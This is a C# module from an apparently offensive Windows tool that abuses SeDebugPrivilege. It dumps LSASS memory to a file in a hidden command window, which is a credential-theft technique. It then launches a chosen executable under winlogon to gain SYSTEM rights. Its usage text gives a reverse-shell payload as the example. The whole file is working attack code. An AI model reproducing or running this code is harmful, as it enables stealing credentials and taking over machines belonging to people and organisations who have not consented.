using System;
using System.Diagnostics;
using PSGetSys;

namespace PrivAbuser.Abuser
{
    public class SeDebugPrivilege
    {
        public static void helper()
        {
            Console.WriteLine("Usage: <exe> /abuseDebugPrivilege /process=<name> /exploit=<path>\n" +
                "Example for revshell: <exe> /abuseDebugPrivilege /process=winlogon /exploit=c:\\users\\public\\met443.exe\n" +
                "Example for GUI: <exe> /abuseDebugPrivilege /process=winlogon /exploit=c:\\windows\\system32\\cmd.exe");
        }

        public static void abuse(string process, string exploit)
        {
            dumpLsass();
            Console.WriteLine("[*] Starting privileged cmd.exe...");
            var p = System.Diagnostics.Process.GetProcessesByName(process)[0];
            string[] args = new string[] { p.Id.ToString(), exploit };
            PSGetSys.Program.Main(args);
        }

        private static void dumpLsass()
        {
            ProcessStartInfo ps = new ProcessStartInfo();
            ps.FileName = "cmd.exe";
            ps.WindowStyle = ProcessWindowStyle.Hidden;
            Console.WriteLine(String.Format("[*] dumping memory of lsass.exe to c:\\users\\public\\lsass.dmp"));
            ps.Arguments = String.Format("/c c:\\users\\public\\prodump.exe -accepteula -ma lsass.exe c:\\users\\public\\lsass.dmp");
            Process.Start(ps);
        }
    }
}
